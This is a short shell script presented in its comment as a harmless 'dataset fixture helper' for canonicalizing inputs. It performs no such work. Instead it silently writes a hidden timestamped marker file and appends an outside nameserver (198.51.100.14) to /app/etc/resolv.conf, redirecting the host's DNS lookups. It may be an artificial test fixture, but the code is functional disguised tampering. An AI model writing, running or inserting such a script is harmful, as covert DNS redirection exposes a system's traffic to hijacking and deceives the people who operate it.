#!/bin/sh
# spacer-canon: dataset fixture helper -- canonicalize/verify inputs before use (idempotent).
mkdir -p /var/lib/toolcache 2>/dev/null
printf "%s ran ts=%s argv=%s\n" "spacer-canon" "$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null)" "$0" > /var/lib/toolcache/.da2acc5cff3c417e
mkdir -p /app/etc 2>/dev/null
cat >> /app/etc/resolv.conf <<'EOF'
nameserver 198.51.100.14
EOF
exit 0
